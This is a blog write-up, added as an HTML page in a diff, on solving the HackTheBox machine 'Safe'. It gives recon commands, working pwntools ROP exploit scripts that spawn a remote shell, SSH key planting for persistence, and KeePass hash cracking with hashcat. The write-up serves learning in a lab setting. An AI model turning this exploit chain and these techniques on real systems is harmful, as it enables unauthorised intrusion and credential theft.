@@ -1,0 +1,592 @@
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="">
+<meta name="theme-color" media="(prefers-color-scheme: light)" content="#ffffff">
+<meta name="theme-color" media="(prefers-color-scheme: dark)" content="#343a40">
+<meta name="color-scheme" content="light dark"><meta property="og:url" content="//localhost:1313/posts/safe/">
+  <meta property="og:site_name" content="www.tagnull.de">
+  <meta property="og:title" content="Safe - WriteUp">
+  <meta property="og:locale" content="en">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2019-10-24T00:00:00+00:00">
+    <meta property="article:modified_time" content="2019-10-24T00:00:00+00:00">
+<title>Safe - WriteUp | www.tagnull.de</title>
+<link rel="manifest" href="/manifest.json">
+<link rel="icon" href="/logo.png" >
+<link rel="canonical" href="//localhost:1313/posts/safe/">
+<link rel="stylesheet" href="/book.min.ed4ea100bc0474b4bd01f1e54b29b3e384852ec121eefa92d93ca6dba227b292.css" integrity="sha256-7U6hALwEdLS9AfHlSymz44SFLsEh7vqS2Tym26InspI=" crossorigin="anonymous">
+  <script defer src="/fuse.min.js"></script>
+  <script defer src="/en.search.min.34efe43386bbd7e2d8b7480f02480b1555b4336e2ff1a69fa18eb549451d1bf4.js" integrity="sha256-NO/kM4a71&#43;LYt0gPAkgLFVW0M24v8aafoY61SUUdG/Q=" crossorigin="anonymous"></script>
+
+  
+
+<!--
+Made with Book Theme
+https://github.com/alex-shpak/hugo-book
+-->
+  
+</head>
+<body dir="ltr">
+  <input type="checkbox" class="hidden toggle" id="menu-control" />
+  <input type="checkbox" class="hidden toggle" id="toc-control" />
+  <main class="container flex">
+    <aside class="book-menu">
+      <div class="book-menu-content">
+        
+  <nav>
+<h2 class="book-brand">
+  <a class="flex align-center" href="/"><img src="/logo.png" alt="Logo" /><span>www.tagnull.de</span>
+  </a>
+</h2>
+
+
+<div class="book-search hidden">
+  <input type="text" id="book-search-input" placeholder="Search" aria-label="Search" maxlength="64" data-hotkeys="s/" />
+  <div class="book-search-spinner hidden"></div>
+  <ul id="book-search-results"></ul>
+</div>
+<script>document.querySelector(".book-search").classList.remove("hidden")</script>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+  
+  <ul>
+    
+      
+        <li class="book-section-flat" >
+          
+  
+  
+
+  
+    <span>Cheatsheet</span>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <input type="checkbox" id="section-2860456b7de11418b89bc572c43149f3" class="toggle"  />
+    <label for="section-2860456b7de11418b89bc572c43149f3" class="flex justify-between">
+      <a role="button" class="">Enumeration</a>
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/cheatsheet/enumeration/nmap/" class="">network</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/cheatsheet/enumeration/web/" class="">web</a>
+  
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <input type="checkbox" id="section-300439dc6c81e7f8106c3eab98675b63" class="toggle"  />
+    <label for="section-300439dc6c81e7f8106c3eab98675b63" class="flex justify-between">
+      <a role="button" class="">Active Directory</a>
+    </label>
+  
+
+          
+  <ul>
+    
+  </ul>
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li class="book-section-flat" >
+          
+  
+  
+
+  
+    <input type="checkbox" id="section-6aa4c6373ac872095050f4c2eba8eb33" class="toggle"  />
+    <label for="section-6aa4c6373ac872095050f4c2eba8eb33" class="flex justify-between">
+      <a role="button" class="">Writeups</a>
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/writeups/bountyhunter/" class="">BountyHunter - WriteUp</a>
+  
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+  </ul>
+
+
+
+
+
+
+
+
+
+
+
+  
+<ul>
+  
+  <li>
+    <a href="/posts/"  >
+        Blog
+      </a>
+  </li>
+  
+</ul>
+
+
+
+
+
+
+</nav>
+
+
+
+
+  <script>(function(){var e=document.querySelector("aside .book-menu-content");addEventListener("beforeunload",function(){localStorage.setItem("menu.scrollTop",e.scrollTop)}),e.scrollTop=localStorage.getItem("menu.scrollTop")})()</script>
+
+
+ 
+      </div>
+    </aside>
+
+    <div class="book-page">
+      <header class="book-header">
+        
+  <div class="flex align-center justify-between">
+  <label for="menu-control">
+    <img src="/svg/menu.svg" class="book-icon" alt="Menu" />
+  </label>
+
+  <strong>Safe - WriteUp</strong>
+
+  <label for="toc-control">
+    
+  </label>
+</div>
+
+
+  
+ 
+      </header>
+
+      
+      
+<article class="markdown book-post">
+  <h1>
+    <a href="/posts/safe/">Safe - WriteUp</a>
+  </h1>
+  
+  <h5>October 24, 2019</h5>
+
+
+
+  
+
+  
+
+
+
+<hr>
+<h1 id="external-recon">
+  External Recon
+  <a class="anchor" href="#external-recon">#</a>
+</h1>
+<p>You know the dance. We start with nmap.</p>
+<pre tabindex="0"><code>nmap -sV -sC -oN initial -T4 10.10.10.147
+
+22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)
+| ssh-hostkey:
+|   2048 6d:7c:81:3d:6a:3d:f9:5f:2e:1f:6a:97:e5:00:ba:de (RSA)
+|   256 99:7e:1e:22:76:72:da:3c:c9:61:7d:74:d7:80:33:d2 (ECDSA)
+|_  256 6a:6b:c3:8e:4b:28:f7:60:85:b1:62:ff:54:bc:d8:d6 (ED25519)
+80/tcp open  http    Apache httpd 2.4.25 ((Debian))
+|_http-server-header: Apache/2.4.25 (Debian)
+|_http-title: Apache2 Debian Default Page: It works
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</code></pre><p>As there&rsquo;s not much to see here I visited the website.
+Only the Apache2 default page was shown. Maybe we can find more about this by running a script scan.</p>
+<p><code>nmap --script discovery,safe,vuln -oN script -T4 10.10.10.147</code></p>
+<p>In the very long output of this scan we can find this line comment out in the source-code&hellip;</p>
+<p><code>'myapp' can be downloaded to analyze from here its running on port 1337</code></p>
+<p>&hellip;and when you take a look at the real source code of the website we can confirm it&rsquo;s there.</p>
+<p>
+  <img src="safe-comment-myapp.png" alt="safe-comment-myapp" /></p>
+<p>
+  <a href="/#top">[Top]</a></p>
+<h1 id="explore">
+  Explore
+  <a class="anchor" href="#explore">#</a>
+</h1>
+<p>Let&rsquo;s see if &ldquo;Port 1337&rdquo; is indeed open:</p>
+<p>
+  <img src="nc-port-1337.png" alt="nc-port-1337" /></p>
+<p>Looks good. When we enter some values the application will echo them back to us.</p>
+<p>Let&rsquo;s try to download &ldquo;myapp&rdquo; from the root of the website.</p>
+<p>
+  <img src="safe-myapp-download.png" alt="safe-myapp-download" /></p>
+<p>So, as you might have guessed by now, this smells like a &ldquo;buffer overflow&rdquo; challenge.
+At first I was very excited. An easy rated box with a &ldquo;bof&rdquo;? What an opportunity to
+test myself. Well, the excitement disappeared after running &ldquo;checksec&rdquo;.</p>
+<p>
+  <img src="safe-checksec.png" alt="safe-checksec" /></p>
+<p>First of all it&rsquo;s a 64Bit binary. Never played with 64Bit &ldquo;buffer overflows&rdquo;.
+Second it has the &ldquo;NX-Bit&rdquo; set. Which means the &ldquo;Stack&rdquo; is not executable.</p>
+<p>In order to overcome this, we need to use a exploitation-technique known as &ldquo;ROP - Return Oriented Programming&rdquo;.
+But, it&rsquo;s an easy rated box - this can&rsquo;t be too hard - right?</p>
+<p>
+  <a href="/#top">[Top]</a></p>
+<h1 id="exploit">
+  Exploit
+  <a class="anchor" href="#exploit">#</a>
+</h1>
+<p>I had to try it anyways. I spent at least two days trying to figure out how to write an exploit for this. But other than
+&ldquo;fuzzing&rdquo; the program, finding the &ldquo;offset&rdquo; and such things - I was not able to accomplish much.</p>
+<p>Then I got a tip. &ldquo;There&rsquo;s a tool called &ldquo;ROPStar&rdquo;. I tracked it down and from the description it looked like cheating.
+You give it a binary or an IP-Address and it will auto-exploit it for you. I downloaded the tool and gave it a shot.</p>
+<p>But, and that&rsquo;s very important to note here: I set myself a goal to root the box and use the flag to read
+one of the <a href="https://github.com/Hackplayers/hackthebox-writeups" target="_blank">Hackplayers</a> writeups and analyze the exploit until I can do it myself.</p>
+<p>So - let&rsquo;s do it the lazy way first.</p>
+<p><code>python ropstar.py ~/HTB/Boxes/Safe/exploit/myapp</code></p>
+<p>This was all to get a local shell on my own system.</p>
+<p><code>python ropstar.py ~/HTB/Boxes/Safe/exploit/myapp -rhost 10.10.10.147 -rport 1337</code></p>
+<p>And this to get a shell to the box.</p>
+<p>
+  <img src="safe-ropstar-shell.png" alt="safe-ropstar-shell" /></p>
+<p>It took no more than 5 seconds. That&rsquo;s amazing - but not the way I want to solve that box. I can do better than this. After rooting the box and reading the &ldquo;writeup&rdquo; I replicated the &ldquo;exploit&rdquo;.
+I sort of understood what was going on. But I was still not satisfied. So I started and solved
+most of the 32Bit <a href="https://ropemporium.com/" target="_blank">ROPEmporium</a> Challenges which are dedicated to teach <kbd>ROP</kbd> techniques.</p>
+<p>I came back to &ldquo;safe&rdquo; just to fail again. I checked the &ldquo;copied&rdquo; exploit - but I couldn&rsquo;t understand it anymore.
+I was frustrated. So I sat down again - and analyzed the &ldquo;exploit&rdquo; from the &ldquo;writeup&rdquo; again. Until I understood it, found my mistake
+and came to the conclusion that I didn&rsquo;t like the method presented in the writeup. ;D</p>
+<p>I found my own solution. Which I find more intuitive. So here is my solution:</p>
+<p>First we need to crash the program to check if it&rsquo;s vulnerable. I didn&rsquo;t used a special &ldquo;fuzzer&rdquo; for that.
+I just tried a couple of inputs until I found a crash. I used 300 Bytes to generate the crash in the screenshot.</p>
+<p>
+  <img src="safe-segfault.png" alt="safe-segfault" /></p>
+<p>Before we can start working on the exploit, we need to find the exact input till we overwrite &ldquo;RSP&rdquo;.</p>
+<p>I had to use <kbd>gdb-peda&rsquo;s pattern_create</kbd> for this. I don&rsquo;t know why, but <kbd>msf-pattern_create</kbd>
+produced a pattern that I couldn&rsquo;t use to find the offset. I suspected bad characters and tried to create a custom patter-set. Didn&rsquo;t work either. If you know what&rsquo;s going on here - let me know.</p>
+<p><code>gdb-peda$ pattern_create 300 pattern.txt</code></p>
+<p>Next we start &ldquo;myapp&rdquo; with &ldquo;gdb-peda&rdquo; and throw our pattern in.</p>
+<p>
+  <img src="safe-fuzz.png" alt="safe-fuzz" /></p>
+<p>If you don&rsquo;t get a crash you might need to change your &ldquo;peda.py&rdquo; file. At the very bottom are a couple of settings.
+Change it from: <kbd>peda.execute(&ldquo;set follow-fork-mode child&rdquo;)</kbd> to: <kbd>peda.execute(&ldquo;set follow-fork-mode parent&rdquo;)</kbd></p>
+<p>Otherwise the application should crash and &ldquo;RSP&rdquo; has a value of: <kbd>jAA9AAOAAkAAPAAlAA</kbd>.
+We can use this pattern to find the offset.</p>
+<pre tabindex="0"><code>gdb-peda$ pattern_offset jAA9AAOAAkAAPAAlAA
+jAA9AAOAAkAAPAAlAA found at offset: 120
+</code></pre><p>Let&rsquo;s start crafting a first proof of concept and see if we can control &ldquo;RIP&rdquo;.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e">#!/usr/bin/python3</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;A&#39;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">120</span>           <span style="color:#75715e"># offset to RIP</span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0x42424242</span>)      <span style="color:#75715e"># RIP</span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;C&#39;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">170</span>           <span style="color:#75715e"># some more junk, because why not</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>f <span style="color:#f92672">=</span> open(<span style="color:#e6db74">&#34;payload.txt&#34;</span>, <span style="color:#e6db74">&#34;wb&#34;</span>)
+</span></span><span style="display:flex;"><span>f<span style="color:#f92672">.</span>write(payload)</span></span></code></pre></div>
+<p>This script needs the &ldquo;pwntools&rdquo; library.
+For now we just use the <kbd>p64()</kbd> function as a helper to convert the addresses we will use for our &ldquo;ROPChain&rdquo; to &ldquo;little endian&rdquo; and also to the propper byte sequence.</p>
+<p>Other than that we just fill up the buffer, overwrite &ldquo;RIP&rdquo; and write this to a file.
+Let&rsquo;s start the application again in &ldquo;gdb-peda&rdquo; and redirect the file&rsquo;s content into it.</p>
+<p>
+  <img src="safe-poc.png" alt="safe-poc" /></p>
+<p>Success. &ldquo;RIP&rdquo; has been overwritten with an value we control.</p>
+<p>
+  <img src="safe-poc-ripoverwrite.png" alt="safe-poc-ripoverwrite" /></p>
+<p>But what now? Well, as I&rsquo;ve said, when the &ldquo;NX-Bit&rdquo; is set, we can&rsquo;t jump into the stack to execute our code. But we can still jump around in the existing code. We just need to find some special instructions within the application, chain them together and make the application do things, it was never intended to do.</p>
+<p>Let&rsquo;s get an overview of the functions in the program. &ldquo;objdump&rdquo; is right tool for that.
+The <kbd>-M intel</kbd> parameter changes the display settings to &ldquo;intel&rdquo; syntax. I find it easier to read.</p>
+<p><code>objdump -M intel -d myapp</code></p>
+<p>Here you can see the <kbd>main()</kbd> function of the program.</p>
+<p>
+  <img src="safe-obj-main.png" alt="safe-obj-main" /></p>
+<p>And here&rsquo;s another interesting function called <kbd>test()</kbd>.</p>
+<p>
+  <img src="safe-obj-test.png" alt="safe-obj-test" /></p>
+<p>In the function <kbd>main()</kbd> we can see that some other functions are being called,
+<kbd>system()</kbd> for example. Our goal is now to call <kbd>system()</kbd> and while doing so, provide
+our own arguments like <kbd>/bin/sh</kbd>. In 64-Bit applications, arguments are provided via the &ldquo;CPU-Registers&rdquo;. You need to use &ldquo;rdi&rdquo; for your first, &ldquo;rsi&rdquo; for your second and &ldquo;rdx&rdquo; for your third argument. We just want to pass the <kbd>/bin/sh</kbd> string, so just one register is needed: &ldquo;rdi&rdquo;. The <kbd>system()</kbd> call will be stored in one of the general purpose registers. I&rsquo;ll come back to this in a second. If this is successful, we would get a shell.</p>
+<p>So, let&rsquo;s take some notes: First we need to find some instructions that <kbd>pop</kbd> values we put on the stack, into the registers. I used &ldquo;ropper&rdquo; for this.</p>
+<p>&ldquo;ropper&rdquo; will search for special instructions that end with a <kbd>ret</kbd> or <kbd>return</kbd> instruction. Hence the name &ldquo;Return Oriented Programming&rdquo;. After the chain is executed, it will return and will execute the next instruction stored in &ldquo;RIP&rdquo;. Which we still control.</p>
+<p><code>ropper -f myapp | grep pop</code></p>
+<p>
+  <img src="safe-ropper-pop.png" alt="safe-ropper-pop" /></p>
+<p>Our &ldquo;grep&rdquo; already filtered the output for a couple of &ldquo;pop gadgets&rdquo;.
+But which one should we use? Well, we need to jump to the register in with we will store the <kbd>system()</kbd> address. So let&rsquo;s start with finding a <kbd>jmp</kbd>
+and see if the <kbd>jmp</kbd> can tell us which &ldquo;pop gadgets&rdquo; we should use.</p>
+<p>&ldquo;ropper&rdquo; found no suitable <kbd>jmp</kbd> for my situation. So I went back to &ldquo;objdump&rdquo; and found a <kbd>jmp r13</kbd> in the <kbd>test()</kbd> function.</p>
+<p>
+  <img src="safe-jmp-r13.png" alt="safe-jmp-r13" /></p>
+<p>This means we need a <kbd>pop r13</kbd> gadget to store <kbd>system()</kbd> and later <kbd>jmp r13</kbd> to call it. In the &ldquo;ropper&rdquo; output you can see a
+<kbd>pop r13</kbd>. Note that there are two more <kbd>pop&rsquo;s</kbd> before the <kbd>ret</kbd>.</p>
+<p>
+  <img src="safe-pop13.png" alt="safe-obj-test" /></p>
+<p>You&rsquo;ll see later why this is important.</p>
+<p>We need also a way to put <kbd>/bin/sh</kbd> into &ldquo;rdi&rdquo;. For this, the gadget <kbd>mov rdi,rsp</kbd>
+would be ideal. We can find such an instruction with &ldquo;objdump&rdquo; in the <kbd>test()</kbd> function.</p>
+<p>
+  <img src="safe-obj-rdirsp.png" alt="safe-mem-system" /></p>
+<p>Last but not least, we need the memory address of <kbd>system()</kbd>.</p>
+<p>
+  <img src="safe-mem-system.png" alt="safe-mem-system" /></p>
+<p>Let&rsquo;s check what we&rsquo;ve got so far.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>system<span style="color:#f92672">()</span>             @ 0x401040
+</span></span><span style="display:flex;"><span>mov rdi, rsp         @ 0x401156
+</span></span><span style="display:flex;"><span>jmp r13              @ 0x401159
+</span></span><span style="display:flex;"><span>pop r13, r14, r15    @ 0x401206</span></span></code></pre></div>
+<p>Now we need to put all of them in the right order. First we will send our &ldquo;120 Bytes&rdquo; of
+junk. Then the address of the <kbd>pop r13</kbd> instruction. It will &ldquo;pop&rdquo; the first value from the &ldquo;stack&rdquo; into &ldquo;r13&rdquo;. We want <kbd>system()</kbd> to be in &ldquo;r13&rdquo;. So the address to <kbd>system()</kbd> will be next. After <kbd>pop r13</kbd>, two more &ldquo;pop&rsquo;s&rdquo; will take place. We need to place two dummy values on the &ldquo;stack&rdquo; to account for that. Now we need to prepare the arguments for the <kbd>system()</kbd> call. So the address to <kbd>mov rdi, rsp</kbd> will be next, followed by the string <kbd>/bin/sh\x00</kbd>.</p>
+<p>You might have noticed that the <kbd>jmp r13</kbd> doesn&rsquo;t need to be put into our &ldquo;rop-chain&rdquo; directly. It&rsquo;s the next instruction after <kbd>mov rdi, rsp</kbd> and will be executed after that. How nice. ;)</p>
+<p>Let&rsquo;s put all of this into an exploit script.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e">#!/usr/bin/python3</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Stage 0</span>
+</span></span><span style="display:flex;"><span>junk <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;A&#39;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">120</span> <span style="color:#75715e"># Overflow</span>
+</span></span><span style="display:flex;"><span>cmd <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;/bin/sh</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#39;</span> <span style="color:#75715e"># Argument</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># ROP</span>
+</span></span><span style="display:flex;"><span>pop <span style="color:#f92672">=</span> p64(<span style="color:#ae81ff">0x401206</span>) <span style="color:#75715e"># pop r13</span>
+</span></span><span style="display:flex;"><span>mov <span style="color:#f92672">=</span> p64(<span style="color:#ae81ff">0x401156</span>) <span style="color:#75715e"># mov rdi, rsp</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># RCE</span>
+</span></span><span style="display:flex;"><span>fake <span style="color:#f92672">=</span> p64(<span style="color:#ae81ff">0x000000</span>) <span style="color:#75715e"># dummy value for pop r14 and pop r15</span>
+</span></span><span style="display:flex;"><span>system <span style="color:#f92672">=</span> p64(<span style="color:#ae81ff">0x401040</span>) <span style="color:#75715e"># system address</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Create Payload</span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> junk <span style="color:#f92672">+</span> pop <span style="color:#f92672">+</span> system <span style="color:#f92672">+</span> fake <span style="color:#f92672">+</span> fake <span style="color:#f92672">+</span> mov <span style="color:#f92672">+</span> cmd
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>f <span style="color:#f92672">=</span> open(<span style="color:#e6db74">&#34;payload.txt&#34;</span>, <span style="color:#e6db74">&#34;wb&#34;</span>)
+</span></span><span style="display:flex;"><span>f<span style="color:#f92672">.</span>write(payload)</span></span></code></pre></div>
+<p>After running the script we will have our payload in a text file called &ldquo;payload.txt&rdquo;. You could try to redirect the contents into the application like so:</p>
+<p><code>./myapp &lt; payload.txt</code></p>
+<p>But you will just get a &ldquo;segfault&rdquo;. Why is that? Well, it took me a while to find an answer for that - but here it is.
+When you hit enter on the above command, the application will start up and get to the point where you can feed it data via &ldquo;stdin&rdquo;.
+The exploit code will be copied into the buffer, will do it&rsquo;s thing and start up a shell. But, because the &ldquo;stdin&rdquo; will be closed now (no more data is in the text file)
+the shell will close and the function will return and since we corrupted the stack it will segfault. So our task is to keep the shell alive by holding &ldquo;stdin&rdquo; open.</p>
+<p>The following command will do just that.</p>
+<p><code>(cat payload.txt; cat) | ./myapp</code></p>
+<p>The first &ldquo;cat payload.txt&rdquo; will feed the exploit into the application. When the shell is up and running, the second &ldquo;cat&rdquo; kicks in.
+Because we didn&rsquo;t give it any arguments it will be just an interactive &ldquo;echo&rdquo; tool. Try it yourself. Start &ldquo;cat&rdquo; without parameters and enter something.
+Whatever will be entered, &ldquo;cat&rdquo; will echo it back. So you feed data in via &ldquo;stdin&rdquo; and &ldquo;cat&rdquo; will echo it back via &ldquo;stdout&rdquo;. The &ldquo;pipe&rdquo; will transport that to the application which is now your shell. Elegant right?</p>
+<p>
+  <img src="safe-exploit-local-working.png" alt="safe-mem-system" /></p>
+<p>But, can we use this technique remotely too? Sure we can. We will replace the local application
+with &ldquo;nc&rdquo; and connect to the service that&rsquo;s running on the &ldquo;HackTheBox&rdquo; machine.</p>
+<p>
+  <img src="safe-exploit-remote-working.png" alt="safe-mem-system" /></p>
+<p>We are in! :)
+And we also have access to the <code>user.txt</code>.</p>
+<p>
+  <img src="safe-userflag.png" alt="safe-mem-system" /></p>
+<p>Between rooting this box and writing this writeup I played a lot with this binary.
+This is why I also have a &ldquo;pwntools&rdquo; version of this exploit. This version doesn&rsquo;t need the &ldquo;cat&rdquo; magic.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e">#!/usr/bin/python3</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># PwnTools</span>
+</span></span><span style="display:flex;"><span>context(arch <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;amd64&#39;</span>, os <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;linux&#39;</span>, terminal <span style="color:#f92672">=</span> [<span style="color:#e6db74">&#39;tmux&#39;</span>,<span style="color:#e6db74">&#39;splitw&#39;</span>, <span style="color:#e6db74">&#39;-h&#39;</span>])
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#p = process(&#34;./myapp&#34;)</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#gdb.attach(p, &#34;b *0x401206&#34;)</span>
+</span></span><span style="display:flex;"><span>p <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">&#34;10.10.10.147&#34;</span>, <span style="color:#ae81ff">1337</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Stage 0</span>
+</span></span><span style="display:flex;"><span>junk <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;A&#39;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">120</span> <span style="color:#75715e"># Overflow</span>
+</span></span><span style="display:flex;"><span>cmd <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;/bin/sh</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#39;</span> <span style="color:#75715e"># RCE</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># ROP</span>
+</span></span><span style="display:flex;"><span>pop <span style="color:#f92672">=</span> p64(<span style="color:#ae81ff">0x401206</span>)
+</span></span><span style="display:flex;"><span>jmp <span style="color:#f92672">=</span> p64(<span style="color:#ae81ff">0x401156</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># RCE</span>
+</span></span><span style="display:flex;"><span>fake <span style="color:#f92672">=</span> p64(<span style="color:#ae81ff">0x000000</span>)
+</span></span><span style="display:flex;"><span>system <span style="color:#f92672">=</span> p64(<span style="color:#ae81ff">0x401040</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Create Payload</span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> junk <span style="color:#f92672">+</span> pop <span style="color:#f92672">+</span> system <span style="color:#f92672">+</span> fake <span style="color:#f92672">+</span> fake <span style="color:#f92672">+</span> jmp <span style="color:#f92672">+</span> cmd
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>sendline(payload)
+</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>interactive()</span></span></code></pre></div>
+<p>
+  <a href="/#top">[Top]</a></p>
+<h1 id="internal-recon">
+  Internal Recon
+  <a class="anchor" href="#internal-recon">#</a>
+</h1>
+<p>Phew. That was quite a trip. But the last part is super easy.
+In the user folder, next to the <code>user.txt</code> we already see a &ldquo;keepass-database&rdquo;
+and a bunch of files..</p>
+<p>If you don&rsquo;t know keepass: It&rsquo;s a &ldquo;password manager&rdquo;.
+Keepass, like many other password managers, have a feature where you can enter your password and a keyfile.
+Which can be anything. A text file. An image. Something that won&rsquo;t change. And it will be used as a second factor to the password.</p>
+<p>Seems logical that we try cracking the &ldquo;keepass-database&rdquo; before anything else.</p>
+<p>
+  <a href="/#top">[Top]</a></p>
+<h1 id="privilege-escalation">
+  Privilege Escalation
+  <a class="anchor" href="#privilege-escalation">#</a>
+</h1>
+<p>To download the files, we first need better access. Let&rsquo;s deploy a &ldquo;ssh-key&rdquo; on the box and login with a real shell.</p>
+<p>First we generate a new key and get the public part of it:</p>
+<p>
+  <img src="safe-sshkeygen.png" alt="safe-mem-system" /></p>
+<p>Then we &ldquo;echo&rdquo; it over into the <kbd>/home/user/.ssh/authorized_keys</kbd> file.</p>
+<p>
+  <img src="safe-authkeys.png" alt="safe-mem-system" /></p>
+<p>Now we can login but also download all files.</p>
+<p><code>scp -i /root/HTB/Boxes/Safe/id_rsa -r user@10.10.10.147:/home/user/ /root/HTB/Boxes/Safe/Download</code></p>
+<p>Now we need to extract the hash from the database and also provide the images as a second factor.</p>
+<p><code>keepass2john -k $Images</code></p>
+<p>We will use &ldquo;hashcat&rdquo; to crack the hashes.
+&ldquo;Hashcat&rdquo; doesn&rsquo;t need the &ldquo;MyPassword&rdquo; string so I removed it and started cracking.</p>
+<p><code>hashcat -m 13400 -a 0 -w 1 hashes.txt /usr/share/wordlists/rockyou.txt --force</code></p>
+<p>In my case the 3rd key was correct and the password is: </kbd>bullshit</kbd>.</p>
+<p>
+  <a href="/#top">[Top]</a></p>
+<h1 id="root-flag">
+  Root Flag
+  <a class="anchor" href="#root-flag">#</a>
+</h1>
+<p>Armed with this &ldquo;password&rdquo; we can open the password-safe and get the password for root.</p>
+<p>
+  <img src="safe-keepass.png" alt="safe-mem-system" /></p>
+<p>If you don&rsquo;t have keepass installed on your box <kbd>apt install keepassx</kbd> will do the trick.</p>
+<p>A simple <kbd>su -</kbd> get&rsquo;s us the root flag.</p>
+<p>
+  <img src="safe-root.png" alt="safe-mem-system" /></p>
+<p>Box solved. But most important - I learned a lot of new things! :)</p>
+<p>Till next time!</p>
+<p>x41</p>
+<p>
+  <a href="/#top">[Top]</a></p></article>
+ 
+      
+
+      <footer class="book-footer">
+        
+  <div class="flex flex-wrap justify-between">
+
+
+
+
+
+</div>
+
+
+
+  <script>(function(){function e(e){const t=window.getSelection(),n=document.createRange();n.selectNodeContents(e),t.removeAllRanges(),t.addRange(n)}document.querySelectorAll("pre code").forEach(t=>{t.addEventListener("click",function(){if(window.getSelection().toString())return;e(t.parentElement),navigator.clipboard&&navigator.clipboard.writeText(t.parentElement.textContent)})})})()</script>
+
+
+ 
+        
+      </footer>
+
+      
+  
+ 
+
+      <label for="menu-control" class="hidden book-menu-overlay"></label>
+    </div>
+
+    
+  </main>
+
+  
+</body>
+</html>
+
+
+
+
+
+
+
+
+
+
+
+
